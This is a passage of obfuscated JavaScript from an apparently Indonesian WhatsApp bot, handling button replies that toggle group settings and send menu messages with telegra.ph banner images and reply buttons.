_0x24deab='*PLAY\x20MUSI'+'C*'+enter+enter+'*Title*\x20:\x20'+_0x2aeaeb+enter+(_0xbd9e(0xa91,0x104f,0xc5b,0xafa)+'3')+enter+_0xbd9e(0x79b,0xb99,0x8a8,0xabd)+_0x563d53+enter+'*Link*\x20:\x20'+_0x2cbf85['data']+enter+enter+(_0x5c6ea7(0x670,0x435,0xa4c,0xa5d)+'tunggu\x20fil'+_0xbd9e(0xafd,0x421,0x6a5,0x78a)+_0xbd9e(0xa71,0x775,0x9b5,0xba2)+_0xbd9e(0xc3f,0x10b0,0xd6f,0xf1e)+_0xbd9e(0xf8b,0x10c4,0xcc8,0x8c1)+_0xbd9e(0x1295,0xb31,0xd72,0xe5f)+'t_');_0x143bdc[_0x5c6ea7(0x9c1,0xdce,0xb9e,0xe97)](sendMediaURL,from,_0x75337c,_0x24deab),await _0x143bdc[_0xbd9e(0x1c8,0x25d,0x5cd,0x2aa)](sendMediaURL,from,_0x5e86ba)['catch'](()=>reply(_0xbd9e(0xc00,0xfc3,0xc52,0x879)));});});}catch(_0x158e20){reply(mess['error'][_0x406083(0x43d,0x475,0x1cd,0x826)]);}}}sub_yt_zeeone_ofc=type==_0x406083(0x6b9,0x8dc,0xa56,0x1f9)+'seMessage'?mek[_0x406083(0x467,0x644,0x4da,0x39b)][_0x4aaba1(0x6ee,0x9b8,0x63b,0x7ce)+_0x4aaba1(0xc2f,0xa8a,0xed6,0x71b)][_0x406083(0xa57,0x6b6,0x72a,0xf0d)]:'',subscribezeeoneofc=type=='buttonsRes'+'ponseMessa'+'ge'?mek[_0x406083(0x467,0x39e,0x789,0x302)]['buttonsRes'+_0x4aaba1(0x7a9,0x8d6,0x2b8,0xa32)+'ge'][_0x4aaba1(0x53e,0x390,0x1b5,0x32c)+'ttonId']:'';if(sub_yt_zeeone_ofc==_0x4aaba1(0x6a5,0x4ab,0x8c4,0x74f)){console[_0x406083(0x462,0xd8,0x8b9,0x5a7)](color(time,_0x406083(0xc2f,0x893,0xefe,0x1006)),color(_0x4aaba1(0x6d5,0x6c3,0x446,0xa95)+_0x4aaba1(0xc94,0x988,0xece,0xad6)+_0x4aaba1(0x402,0x812,0x4e7,0x8d1)));if(!isBotGroupAdmins)return reply(_0x406083(0x919,0xd31,0xd54,0xa27)+'\x20Bot\x20sebag'+'ai\x20admin\x20t'+'erlebih\x20da'+_0x4aaba1(0x707,0x4b6,0xa22,0x430));await alpha[_0x4aaba1(0x7c2,0x720,0x5f1,0x80e)+_0x406083(0xc38,0xf81,0xdef,0xb39)](from,GroupSettingChange[_0x4aaba1(0xd14,0xc01,0x813,0xfd9)+'d'],![]),fakegroup('```SUCCESS'+_0x4aaba1(0x70f,0x2af,0x4b9,0x3a4)+_0x406083(0x81b,0xbf2,0xaa3,0x3bc)+'``');}if(sub_yt_zeeone_ofc==_0x406083(0xab9,0x85e,0xa28,0xaf6)+'e'){console[_0x4aaba1(0x497,0x1c,0x5f9,0x81a)](color(time,'magenta'),color(_0x4aaba1(0x6d5,0x7fa,0x7a8,0x736)+_0x406083(0xbca,0xda8,0x1018,0x8ec)+_0x4aaba1(0x3b4,0x85c,0x845,0x102)));if(!isBotGroupAdmins)return reply(_0x406083(0x919,0xa09,0xb51,0x949)+_0x406083(0x5a4,0x4ec,0x70d,0x264)+_0x4aaba1(0xac2,0x646,0xcee,0x88e)+'erlebih\x20da'+_0x406083(0x6d2,0x1c0,0x43b,0x9ce));await alpha[_0x4aaba1(0x7c2,0xc47,0xa6e,0x603)+_0x406083(0xc38,0x91f,0x74a,0xe7b)](from,GroupSettingChange[_0x4aaba1(0xd14,0xa99,0x87e,0xa8a)+'d'],!![]),fakegroup(_0x406083(0xd40,0x86c,0xef4,0xc0f)+_0x406083(0x5aa,0x7a5,0x80e,0xf9)+'G\x20GROUP```');}if(sub_yt_zeeone_ofc==_0x4aaba1(0x541,0x5d5,0x3a2,0x401)){console['log'](color(time,_0x406083(0xc2f,0x1021,0xac2,0xcf0)),color(_0x4aaba1(0x6d5,0x620,0x84a,0x255)+_0x406083(0xd31,0xa48,0x1041,0xde2)+_0x4aaba1(0x90e,0x466,0x573,0xb51)));var quoteamzk=await getBuffer(_0x4aaba1(0x624,0x451,0x5cd,0x72a)+_0x406083(0x610,0x68c,0x252,0x675)+_0x406083(0x9a4,0xd95,0xd55,0xda8)+'653158378f'+_0x406083(0x98c,0x86d,0x8e8,0x925));const _0x364dea={};_0x364dea[_0x406083(0x50e,0x81,0x912,0x846)+'t']=_0x406083(0xa7b,0x962,0xd6f,0xcc6);const _0x1bdaf1={};_0x1bdaf1[_0x406083(0x758,0xa64,0x78d,0x581)]=_0x406083(0xaa9,0x70b,0x80f,0xae6),_0x1bdaf1[_0x406083(0x6b4,0x73d,0xbaa,0xb70)]=_0x364dea,_0x1bdaf1[_0x4aaba1(0x816,0x9e0,0x824,0xab1)]=0x1;const _0x74dfd9={};_0x74dfd9[_0x4aaba1(0x543,0x4e4,0x291,0x43c)+'t']=_0x406083(0x69e,0xb3b,0xa38,0x3f7);const _0x22b452={};_0x22b452['buttonId']=_0x4aaba1(0xd52,0xa57,0xcbf,0x861),_0x22b452['buttonText']=_0x74dfd9,_0x22b452['type']=0x1,sendButLocation(from,quotesmenu(prefix),''+tampilTanggal+enter+tampilWaktu+enter+enter+_0x4aaba1(0x3da,0x42f,0x206,-0x54)+ini_mark[_0x4aaba1(0x6ab,0x5da,0x43f,0xae0)]('@')[-0x1d2b+-0x1f0d*-0x1+-0x1e2],quoteamzk,[_0x1bdaf1,_0x22b452],{'contextInfo':{'mentionedJid':[ini_mark]}});}if(sub_yt_zeeone_ofc==_0x4aaba1(0xa54,0xaf0,0xd15,0x9a7)){console[_0x406083(0x462,0x7bb,0x574,0x948)](color(time,_0x4aaba1(0xc64,0x1026,0x88d,0xa38)),color(_0x4aaba1(0x6d5,0x816,0x53b,0x991)+_0x406083(0x9e8,0xc5e,0xb84,0x80e)+'nu'));var animkzka=await getBuffer('https://te'+_0x4aaba1(0x645,0xa43,0x49b,0x419)+_0x406083(0xce9,0xaa7,0xa8b,0xc27)+'684ea07ea1'+_0x4aaba1(0x7cb,0xa7e,0x2da,0x93c));const _0x12c25b={};_0x12c25b['displayTex'+'t']=_0x4aaba1(0xab0,0xa2a,0xf8b,0x800);const _0x3d3710={};_0x3d3710[_0x4aaba1(0x78d,0x6c3,0x44e,0x2c8)]=_0x406083(0xaa9,0xae2,0x9f1,0xfbb),_0x3d3710[_0x406083(0x6b4,0xba1,0x19a,0x58a)]=_0x12c25b,_0x3d3710[_0x406083(0x7e1,0x60f,0x384,0x6b4)]=0x1;const _0x2f5091={};_0x2f5091[_0x406083(0x50e,0x152,0x385,0x4e4)+'t']=_0x406083(0x69e,0x7de,0x413,0x3b6);const _0xd0125f={};_0xd0125f[_0x406083(0x758,0x7e8,0x51b,0x487)]=_0x4aaba1(0xd52,0xef3,0x8e1,0xf36),_0xd0125f[_0x4aaba1(0x6e9,0xa4f,0x89c,0xb16)]=_0x2f5091,_0xd0125f[_0x406083(0x7e1,0x2f8,0xb41,0x301)]=0x1,sendButLocation(from,animemenu(prefix),''+tampilTanggal+enter+tampilWaktu+enter+enter+_0x406083(0x3a5,0x84c,0x24b,0x211)+ini_mark['split']('@')[0x2206*-0x1+0x31*0x6d+-0xd29*-0x1],animkzka,[_0x3d3710,_0xd0125f],{'contextInfo':{'mentionedJid':[ini_mark]}});}if(sub_yt_zeeone_ofc=='convertmen'+'u'){console['log'](color(time,_0x4aaba1(0xc64,0xf37,0xd7f,0xfb1)),color(_0x4aaba1(0x6d5,0x407,0x834,0x303)+_0x406083(0xcea,0xdc6,0xa5b,0x117d)+_0x4aaba1(0x638,0x3d1,0x2fc,0x729)));var converkdk=await getBuffer(_0x406083(0x5ef,0x6f1,0x88a,0xa09)+'legra.ph/f'+_0x4aaba1(0xb07,0xf08,0x80d,0xc96)+_0x4aaba1(0x729,0x59c,0x7bb,0x6f3)+_0x4aaba1(0x5ba,0x5bc,0xb1,0x688));const _0x3b7aa6={};_0x3b7aa6[_0x4aaba1(0x543,0x196,0x82c,0x296)+'t']=_0x4aaba1(0xab0,0xbcf,0xa72,0xf18);const _0x13e14f={};_0x13e14f[_0x406083(0x758,0x43c,0xaf4,0x860)]=_0x4aaba1(0xade,0xab4,0xd92,0xa82),_0x13e14f[_0x406083(0x6b4,0x3c0,0x26c,0x9ee)]=_0x3b7aa6,_0x13e14f['type']=0x1;const _0x3b0ae9={};_0x3b0ae9[_0x406083(0x50e,0xf3,0x21,0x808)+'t']='✓\x20OWNER';const _0x17a00b={};_0x17a00b[_0x4aaba1(0x78d,0x331,0x5cf,0x501)]=_0x406083(0xd1d,0x949,0x9e6,0xbd3),_0x17a00b[_0x4aaba1(0x6e9,0x231,0xc03,0x9e5)]=_0x3b0ae9,_0x17a00b[_0x406083(0x7e1,0xc0e,0x440,0x8ec)]=0x1,sendButLocation(from,convertmenu(prefix),''+tampilTanggal+enter+tampilWaktu+enter+enter+_0x406083(0x3a5,0x380,0x6b2,0xca)+ini_mark[_0x4aaba1(0x6ab,0x4e5,0x9bb,0x6e9)]('@')[0x9ff*0x3+0xf4f+0xb53*-0x4],converkdk,[_0x13e14f,_0x17a00b],{'contextInfo':{'mentionedJid':[ini_mark]}});}if(sub_yt_zeeone_ofc==_0x4aaba1(0x606,0x6e2,0x76c,0xac9)){console[_0x4aaba1(0x497,0x647,0x1c9,0x486)](color(time,_0x4aaba1(0xc64,0xec8,0xc6a,0xeb4)),color('List\x20messa'+'ge\x20asupan\x20'+_0x4aaba1(0x638,0x7f8,0x6c7,0x152)));var nsfwkak=await getBuffer(_0x406083(0x5ef,0xa10,0x331,0x4f5)+'legra.ph/f'+'ile/487eeb'+_0x4aaba1(0xd18,0xdb7,0xccb,0xee9)+_0x406083(0x9b4,0x93b,0x518,0x918));const _0xe07a95={};_0xe07a95[_0x406083(0x50e,0x641,0x54,0x3d6)+'t']=_0x4aaba1(0xab0,0x61c,0xd51,0xadc);const _0x2064b1={};_0x2064b1[_0x4aaba1(0x78d,0x751,0x33e,0xafe)]='Command',_0x2064b1[_0x406083(0x6b4,0xa57,0xa66,0x836)]=_0xe07a95,_0x2064b1[_0x406083(0x7e1,0xc85,0xb74,0x403)]=0x1;const _0x58653d={};_0x58653d[_0x4aaba1(0x543,0x5e,0x571,0x296)+'t']=_0x4aaba1(0x6d3,0x703,0x720,0x4f6);const _0x295343={};_0x295343['buttonId']='owner',_0x295343['buttonText']=_0x58653d,_0x295343[_0x406083(0x7e1,0x3ff,0xcf6,0x684)]=0x1,sendButLocation(from,nsfwmenu(prefix),''+tampilTanggal+enter+tampilWaktu+enter+enter+_0x406083(0x3a5,0x129,0x381,0x157)+ini_mark[_0x406083(0x676,0xab5,0x371,0x6f1)]('@')[0x1fb8+0x1e1*0x4+0x1f*-0x144],nsfwkak,[_0x2064b1,_0x295343],{'contextInfo':{'mentionedJid':[ini_mark]}});}if(sub_yt_zeeone_ofc=='asupan\x20men'+'u'){console[_0x4aaba1(0x497,0x55f,0x519,0x7b3)](color(time,'magenta'),color(_0x4aaba1(0x6d5,0x409,0x9d0,0x591)+_0x4aaba1(0x56b,0x9b6,0x6d6,0x30e)+_0x406083(0x603,0x106,0xad5,0x4d9)));var asupanak=await getBuffer(_0x406083(0x5ef,0x6a7,0x2a1,0x407)+_0x406083(0x610,0xa01,0x5f9,0x3bb)+'ile/cb6aaa'+_0x406083(0xba0,0xb22,0xfbd,0xc28)+'88f9e.jpg');const _0x546e98={};_0x546e98[_0x406083(0x50e,0x303,0x48e,0x59b)+'t']=_0x4aaba1(0xab0,0xf26,0xc81,0x669);const _0x273027={};_0x273027[_0x4aaba1(0x78d,0x3d9,0x327,0x56b)]=_0x406083(0xaa9,0xf5f,0x7ec,0xcb5),_0x273027[_0x406083(0x6b4,0x7e9,0xab6,0x2aa)]=_0x546e98,_0x273027['type']=0x1;const _0x36a79b={};_0x36a79b['displayTex'+'t']='✓\x20OWNER';const _0x2ba685={};_0x2ba685[_0x406083(0x758,0x7af,0x820,0x388)]=_0x4aaba1(0xd52,0x1128,0x1014,0xeeb),_0x2ba685['buttonText']=_0x36a79b,_0x2ba685[_0x4aaba1(0x816,0xb67,0xb12,0x71b)]=0x1,sendButLocation(from,asupanmenu(prefix),''+tampilTanggal+enter+tampilWaktu+enter+enter+_0x406083(0x3a5,0x63b,0x226,0x10c)+ini_mark['split']('@')[0x5*-0x347+0x3c+0x1*0x1027],asupanak,[_0x273027,_0x2ba685],{'contextInfo':{'mentionedJid':[ini_mark]}});}if(sub_yt_zeeone_ofc==_0x406083(0xaea,0x7d1,0x5e8,0xd9f)+'ot'){console[_0x406083(0x462,0x3db,0xd6,0x2d1)](color(time,_0x4aaba1(0xc64,0xd2e,0xe86,0x766)),color('Jika\x20menu\x20'+_0x406083(0x9e0,0x904,0x64d,0x8c1)+_0x4aaba1(0x3e6,0x901,0x442,0x4dd)+_0x4aaba1(0x84a,0x769,0xbff,0x69e)+_0x4aaba1(0x94c,0xd48,0x8d5,0xabe)));var allmenuk=await getBuffer(_0x406083(0x5ef,0x2f5,0x60f,0x5d8)+'legra.ph/f'+_0x406083(0x752,0x79a,0xa44,0x73e)+_0x406083(0xafc,0xd16,0x92f,0x90b)+_0x406083(0x3d6,0x719,0x326,0x795));const _0x50ee70={};_0x50ee70[_0x406083(0x50e,0x783,0x1c8,0x1e6)+'t']='⋮☰\x20BACK';const _0x5912bc={};_0x5912bc['buttonId']=_0x4aaba1(0xade,0x759,0xaa0,0xf22),_0x5912bc[_0x4aaba1(0x6e9,0x6ae,0x33c,0x337)]=_0x50ee70,_0x5912bc[_0x406083(0x7e1,0xbd0,0xa93,0x79c)]=0x1;const _0x4708dc={};_0x4708dc[_0x406083(0x50e,0x7d3,0x194,0x9f7)+'t']='✓\x20OWNER';const _0x44d8b4={};_0x44d8b4[_0x4aaba1(0x78d,0x47d,0x4f2,0x56e)]=_0x4aaba1(0xd52,0xf3f,0x91f,0xf25),_0x44d8b4[_0x4aaba1(0x6e9,0x789,0x68f,0x689)]=_0x4708dc,_0x44d8b4['type']=0x1,sendButLocation(from,allmenu(prefix,wita,wit,ucapannya2,timuu,status,wa_version,mcc,mnc,os_version,device_manufacturer,device_model,alfa,alfa1,thisDay,ini_tanggal,totalchat,hit_today,ini_gcchat),''+tampilTanggal+enter+tampilWaktu+enter+enter+_0x4aaba1(0x3da,0x529,0x6e8,0x195)+ini_mark[_0x4aaba1(0x6ab,0x5a9,0x1fb,0xa2e)]('@')[-0x1*-0x812+-0x1ae0+-0xa6*-0x1d],allmenuk,[_0x5912bc,_0x44d8b4],{'contextInfo':{'mentionedJid':[ini_mark]}});}if(sub_yt_zeeone_ofc==_0x406083(0x92a,0x9a3,0xbc1,0xc2f)+'nu'){console[_0x406083(0x462,0x6bd,0x1ad,0x467)](color(time,_0x406083(0xc2f,0xaed,0x1041,0xafc)),color(_0x406083(0x6a0,0x390,0x34b,0xaa5)+_0x406083(0xd0f,0xc5a,0x7ef,0x11b7)+_0x4aaba1(0x4ee,0x4a3,0x2eb,0x60b)));var downloadlsl=await getBuffer('https://te'+_0x4aaba1(0x645,0x318,0x940,0xabd)+_0x406083(0x47c,0xb2,0x8a6,0x325)+_0x4aaba1(0xd9f,0xeeb,0x117f,0x1171)+_0x4aaba1(0xb80,0x9ad,0xaa6,0x735));const _0x1632f4={};_0x1632f4[_0x4aaba1(0x543,0x2ae,0x973,0x701)+'t']=_0x4aaba1(0xab0,0xab7,0x988,0x595);const _0x61f73f={};_0x61f73f['buttonId']=_0x406083(0xaa9,0xae4,0x655,0xe5a),_0x61f73f[_0x4aaba1(0x6e9,0x74b,0x5df,0x670)]=_0x1632f4,_0x61f73f[_0x406083(0x7e1,0x9b8,0x59e,0xc70)]=0x1;const _0x100e84={};_0x100e84[_0x4aaba1(0x543,0x3d5,0x6f9,0x4f3)+'t']=_0x4aaba1(0x6d3,0x376,0x1da,0x56d);const _0x8ff9f5={};_0x8ff9f5['buttonId']=_0x406083(0xd1d,0x9c8,0xc07,0x9f6),_0x8ff9f5[_0x4aaba1(0x6e9,0x94d,0x688,0x408)]=_0x100e84,_0x8ff9f5[_0x4aaba1(0x816,0x971,0x8ce,0x6fb)]=0x1,sendButLocation(from,downloadmenu(prefix),''+tampilTanggal+enter+tampilWaktu+enter+enter+'Regard\x20@'+ini_mark[_0x4aaba1(0x6ab,0xb0a,0xa27,0x7a1)]('@')[-0x1*0x2063+0x19*0x45+0x1d5*0xe],downloadlsl,[_0x61f73f,_0x8ff9f5],{'contextInfo':{'mentionedJid':[ini_mark]}});}if(sub_yt_zeeone_ofc==_0x406083(0x918,0xd63,0xb98,0x7d2)){console[_0x406083(0x462,0x20c,0x1ed,0x2b7)](color(time,_0x4aaba1(0xc64,0x10b1,0x848,0x7b9)),color(_0x4aaba1(0x6d5,0x3b7,0xafd,0x984)+'ge\x20funmenu'));var funmenujs=await getBuffer(_0x4aaba1(0x624,0x4da,0x29e,0x842)+_0x406083(0x610,0x10c,0x64d,0x875)+_0x4aaba1(0x601,0xa3a,0xa11,0x954)+_0x406083(0x6a3,0x8d7,0x695,0x9b2)+_0x4aaba1(0x96c,0x5f9,0xa9f,0x70c));const _0x1b376a={};_0x1b376a[_0x4aaba1(0x543,0x99a,0x6ec,0x63a)+'t']=_0x406083(0xa7b,0xa8c,0xc36,0xdaa);const _0x1e2703={};_0x1e2703[_0x4aaba1(0x78d,0x858,0xbfe,0xa97)]='Command',_0x1e2703[_0x406083(0x6b4,0x49d,0x8d2,0x1e8)]=_0x1b376a,_0x1e2703[_0x4aaba1(0x816,0x5fa,0x84c,0x7d8)]=0x1;const _0x56fd80={};_0x56fd80[_0x406083(0x50e,-0x7,0x46a,0x900)+'t']=_0x4aaba1(0x6d3,0x278,0x542,0x66b);const _0x475466={};_0x475466[_0x4aaba1(0x78d,0x2cd,0x3f3,0xb25)]='owner',_0x475466['buttonText']=_0x56fd80,_0x475466[_0x406083(0x7e1,0x3bd,0xa11,0xce2)]=0x1,sendButLocation(from,funmenu(prefix),''+tampilTanggal+enter+tampilWaktu+enter+enter+'Regard\x20@'+ini_mark[_0x406083(0x676,0x7bb,0x36a,0x20a)]('@')[-0x1*0x2e0+-0x1f18+0x21f8],funmenujs,[_0x1e2703,_0x475466],{'contextInfo':{'mentionedJid':[ini_mark]}});}if(sub_yt_zeeone_ofc=='makermenu'){console[_0x4aaba1(0x497,0x40f,0x38c,0x813)](color(time,_0x406083(0xc2f,0xe9b,0xdc3,0x871)),color(_0x406083(0x6a0,0x73e,0x97a,0x631)+_0x4aaba1(0x484,0x5cc,0x76a,0x591)+'nu'));var makermenksk=await getBuffer('https://te'+'legra.ph/f'+_0x4aaba1(0x829,0xb51,0x7ae,0x6db)+_0x4aaba1(0x449,0x577,0x308,0x584)+_0x4aaba1(0xb49,0xcf7,0xc94,0x920));const _0x27cffa={};_0x27cffa[_0x4aaba1(0x543,0xa13,0x34b,0xb5)+'t']=_0x4aaba1(0xab0,0xd0e,0x9cb,0x700);const _0x5269ad={};_0x5269ad[_0x4aaba1(0x78d,0x6ec,0x585,0xac8)]=_0x4aaba1(0xade,0x6e4,0xd4b,0x646),_0x5269ad[_0x4aaba1(0x6e9,0x896,0x46a,0x29f)]=_0x27cffa,_0x5269ad[_0x406083(0x7e1,0xd07,0x2f0,0x53c)]=0x1;const _0x4ef8a1={};_0x4ef8a1[_0x4aaba1(0x543,0x8bf,0x448,0xd2)+'t']=_0x406083(0x69e,0x71e,0x3a4,0x7c1);const _0x3a89ce={};_0x3a89ce[_0x4aaba1(0x78d,0x4be,0x4c3,0xb9d)]=_0x4aaba1(0xd52,0x10f1,0xc4f,0xedb),_0x3a89ce[_0x4aaba1(0x6e9,0x25d,0x9b5,0x7c0)]=_0x4ef8a1,_0x3a89ce[_0x406083(0x7e1,0x4ad,0x986,0x414)]=0x1,sendButLocation(from,makermenu(prefix),''+tampilTanggal+enter+tampilWaktu+enter+enter+_0x4aaba1(0x3da,0x82d,0x6e5,0x448)+ini_mark[_0x406083(0x676,0x5d1,0x814,0x7f9)]('@')[0x931+0x9ad+-0x142*0xf],makermenksk,[_0x5269ad,_0x3a89ce],{'contextInfo':{'mentionedJid':[ini_mark]}});}if(sub_yt_zeeone_ofc=='textpromen'+'u'){console[_0x4aaba1(0x497,0x7e3,0x222,0x7be)](color(time,_0x4aaba1(0xc64,0x785,0x927,0x8e5)),color('List\x20messa'+'ge\x20textpro'+_0x406083(0x603,0x636,0x346,0x12e)));var textjskzb=await getBuffer(_0x406083(0x5ef,0x80e,0x183,0x49e)+_0x4aaba1(0x645,0x158,0x322,0x366)+_0x4aaba1(0x4cc,0x7c2,0x64c,0x8)+_0x4aaba1(0x4f2,0x805,0x92d,0x4c7)+_0x4aaba1(0x828,0xd26,0xcb2,0x3c1));const _0x27cb22={};_0x27cb22[_0x4aaba1(0x543,0xd1,0x6b2,0x580)+'t']=_0x4aaba1(0xab0,0xbed,0xa50,0x592);const _0x54b2a1={};_0x54b2a1['buttonId']=_0x4aaba1(0xade,0xc02,0x7a9,0x7a4),_0x54b2a1['buttonText']=_0x27cb22,_0x54b2a1[_0x4aaba1(0x816,0x40d,0xc0e,0xd3a)]=0x1;const _0x3e66f3={};_0x3e66f3[_0x406083(0x50e,0x479,0x54b,0x85)+'t']=_0x406083(0x69e,0x463,0x4da,0xacc);const _0xb3154c={};_0xb3154c[_0x406083(0x758,0x9bb,0x7fd,0x7e4)]='owner',_0xb3154c[_0x406083(0x6b4,0x359,0x68d,0x50a)]=_0x3e66f3,_0xb3154c[_0x4aaba1(0x816,0xa99,0x9fe,0x386)]=0x1,sendButLocation(from,textpromenu(prefix),''+tampilTanggal+enter+tampilWaktu+enter+enter+_0x4aaba1(0x3da,0x1c2,0x778,0x537)+ini_mark['split']('@')[-0x26cd*-0x1+-0xdbd*0x1+-0x1910],textjskzb,[_0x54b2a1,_0xb3154c],{'contextInfo':{'mentionedJid':[ini_mark]}});}if(sub_yt_zeeone_ofc==_0x4aaba1(0x7dc,0xa1b,0x321,0x6d8)+'nu'){console[_0x4aaba1(0x497,0x1d4,0x743,0xba)](color(time,_0x4aaba1(0xc64,0xbc8,0x106b,0xa83)),color(_0x406083(0x6a0,0x3d1,0x667,0xa40)+_0x4aaba1(0x923,0xe48,0x5d6,0x575)+'ymenu'));var pdkdk=await getBuffer(_0x4aaba1(0x624,0xa1f,0x2bd,0x2ac)+'legra.ph/f'+_0x4aaba1(0x4b8,0x718,0x793,0x53b)+_0x4aaba1(0x5e0,0x17a,0x402,0xa98)+_0x4aaba1(0x6cd,0x42b,0x8c0,0xb82));const _0x39a651={};_0x39a651['displayTex'+'t']=_0x406083(0xa7b,0xd75,0xa5e,0x6ed);const _0x78039a={};_0x78039a[_0x4aaba1(0x78d,0x357,0xb22,0xb3d)]=_0x406083(0xaa9,0xb64,0x90a,0x9a0),_0x78039a[_0x406083(0x6b4,0x9d8,0x7f4,0x69b)]=_0x39a651,_0x78039a[_0x4aaba1(0x816,0x542,0xa08,0xa8a)]=0x1;const _0xb555a7={};_0xb555a7[_0x406083(0x50e,0x9ee,0x182,0x79)+'t']=_0x406083(0x69e,0x7e7,0x27b,0x596);const _0x16fd76={};_0x16fd76[_0x406083(0x758,0x7bd,0x92b,0x94b)]='owner',_0x16fd76[_0x406083(0x6b4,0x7bb,0xa73,0xbba)]=_0xb555a7,_0x16fd76[_0x4aaba1(0x816,0xaf6,0x7c1,0x919)]=0x1,sendButLocation(from,photooxymenu(prefix),''+tampilTanggal+enter+tampilWaktu+enter+enter+'Regard\x20@'+ini_mark['split']('@')[-0x2281+-0x1*0x1b3d+0x3dbe*0x1],pdkdk,[_0x78039a,_0x16fd76],{'contextInfo':{'mentionedJid':[ini_mark]}});}if(sub_yt_zeeone_ofc==_0x4aaba1(0xc87,0xad0,0x9ff,0xd1c)){console[_0x406083(0x462,0x3d2,-0xa1,0x2cb)](color(time,'magenta'),color('List\x20messa'+_0x4aaba1(0xaea,0x863,0xf85,0xe5c)+'nu'));var othendjke=await getBuffer('https://te'+'legra.ph/f'+'ile/ec84cb'+'d89eeaefc6'+'2987d.jpg');const _0x162ac1={};_0x162ac1[_0x4aaba1(0x543,0x954,0x694,0x795)+'t']=_0x406083(0xa7b,0x5af,0x67b,0xc22);const _0x53e26a={};_0x53e26a[_0x406083(0x758,0x3d7,0xab1,0x61b)]=_0x4aaba1(0xade,0xb5f,0x637,0x8a6),_0x53e26a[_0x4aaba1(0x6e9,0x787,0x4d4,0x7fc)]=_0x162ac1,_0x53e26a['type']=0x1;const _0x2cb44e={};_0x2cb44e[_0x4aaba1(0x543,0x617,0x4e4,0x946)+'t']=_0x4aaba1(0x6d3,0x71a,0x387,0x3cb);const _0x31e4d1={};_0x31e4d1[_0x406083(0x758,0x8b7,0x47a,0xc38)]=_0x4aaba1(0xd52,0xf64,0x1104,0xf9a),_0x31e4d1[_0x406083(0x6b4,0x7ab,0x781,0x8ff)]=_0x2cb44e,_0x31e4d1[_0x4aaba1(0x816,0x508,0xae9,0x8cf)]=0x1,sendButLocation(from,othermenu(prefix),''+tampilTanggal+enter+tampilWaktu+enter+enter+_0x406083(0x3a5,0x65,0x59b,0x1c6)+ini_mark[_0x4aaba1(0x6ab,0x4e6,0x485,0x74f)]('@')[0x1*0x2563+-0x1475+-0xc5*0x16],othendjke,[_0x53e26a,_0x31e4d1],{'contextInfo':{'mentionedJid':[ini_mark]}});}if(sub_yt_zeeone_ofc=='ownermenu'){console[_0x4aaba1(0x497,0x457,0x924,0x669)](color(time,'magenta'),color(_0x4aaba1(0x6d5,0x3aa,0x358,0x96b)+_0x4aaba1(0x5bb,0xa46,0x350,0x65c)+'nu'));var ownermenjdu=await getBuffer(_0x4aaba1(0x624,0x1e5,0x542,0x26c)+_0x4aaba1(0x645,0x74b,0x836,0x5df)+_0x4aaba1(0x83e,0xa0c,0x7fe,0xd33)+'d6da00d7ae'+'99c5f.jpg');const _0x37dd7d={};_0x37dd7d[_0x406083(0x50e,0x245,0x3ea,0x530)+'t']='⋮☰\x20BACK';const _0x58d0bf={};_0x58d0bf['buttonId']=_0x406083(0xaa9,0x7bd,0x6a6,0xd6d),_0x58d0bf['buttonText']=_0x37dd7d,_0x58d0bf['type']=0x1;const _0x10af96={};_0x10af96['displayTex'+'t']=_0x4aaba1(0x6d3,0x6b8,0x96b,0x67a);const _0x2951af={};_0x2951af[_0x4aaba1(0x78d,0x52b,0xc4d,0xb7a)]=_0x406083(0xd1d,0xad9,0x11fc,0xecd),_0x2951af[_0x4aaba1(0x6e9,0x733,0x8eb,0x8ec)]=_0x10af96,_0x2951af[_0x4aaba1(0x816,0x9e0,0x9bd,0xb87)]=0x1,sendButLocation(from,ownermenu(prefix),''+tampilTanggal+enter+tampilWaktu+enter+enter+'Regard\x20@'+ini_mark['split']('@')[0x4d*0x1f+-0x2*0x202+-0x54f],ownermenjdu,[_0x58d0bf,_0x2951af],{'contextInfo':{'mentionedJid':[ini_mark]}});}if(sub_yt_zeeone_ofc==_0x406083(0x6b1,0x418,0x3fe,0x4d5)+'u'){console[_0x4aaba1(0x497,-0x56,0x432,0x243)](color(time,'magenta'),color(_0x4aaba1(0x6d5,0xb8b,0x50c,0x99e)+_0x406083(0xb47,0x95b,0xc72,0xb2f)+_0x406083(0x603,0x4a6,0x64b,0xac6)));var storagemsn=await getBuffer('https://te'+_0x4aaba1(0x645,0x992,0x870,0x496)+_0x4aaba1(0xdc2,0x9df,0xf64,0xd94)+_0x4aaba1(0x852,0xa35,0x916,0xd27)+_0x4aaba1(0x459,0x4ef,0x2b9,0x232));const _0x25f645={};_0x25f645['displayTex'+'t']=_0x4aaba1(0xab0,0x8f4,0xe07,0xf47);const _0x169608={};_0x169608[_0x4aaba1(0x78d,0x922,0x37c,0xb44)]=_0x4aaba1(0xade,0x905,0x7ee,0xda9),_0x169608[_0x406083(0x6b4,0x754,0xbb1,0x70f)]=_0x25f645,_0x169608[_0x406083(0x7e1,0xc33,0xc2e,0x2ff)]=0x1;const _0x18ec57={};_0x18ec57[_0x4aaba1(0x543,0x9f7,0x6bd,0x34)+'t']=_0x4aaba1(0x6d3,0xab7,0x4c2,0x8a1);const _0x3cd639={};_0x3cd639['buttonId']=_0x4aaba1(0xd52,0xfa2,0xd6f,0x8a4),_0x3cd639['buttonText']=_0x18ec57,_0x3cd639[_0x406083(0x7e1,0xa90,0x818,0x536)]=0x1,sendButLocation(from,storagemenu(prefix),''+tampilTanggal+enter+tampilWaktu+enter+enter+_0x406083(0x3a5,-0x12d,0x795,-0x14b)+ini_mark[_0x4aaba1(0x6ab,0x84c,0x94d,0x68b)]('@')[0x1*-0x138b+0x4fb*0x5+-0x7*0xc4],storagemsn,[_0x169608,_0x3cd639],{'contextInfo':{'mentionedJid':[ini_mark]}});}function _0x4aaba1(_0x1dee1f,_0x30da07,_0x39e299,_0xae40ec){return _0x34ec(_0x1dee1f-0x1c9,_0x30da07);}if(sub_yt_zeeone_ofc=='tagmenu'){console['log'](color(time,_0x4aaba1(0xc64,0xd1e,0x8fd,0x1172)),color(_0x4aaba1(0x6d5,0x55a,0x478,0x259)+_0x406083(0x58f,0x693,0x8e,0x3e7)));var tagmwnjn=await getBuffer(_0x4aaba1(0x624,0x202,0x58f,0x39e)+_0x406083(0x610,0x362,0x21b,0x9ab)+_0x4aaba1(0xb34,0x8f2,0xbeb,0xe41)+_0x406083(0xa09,0xc30,0x7bf,0x805)+_0x4aaba1(0x612,0x4d7,0x487,0x8c9));const 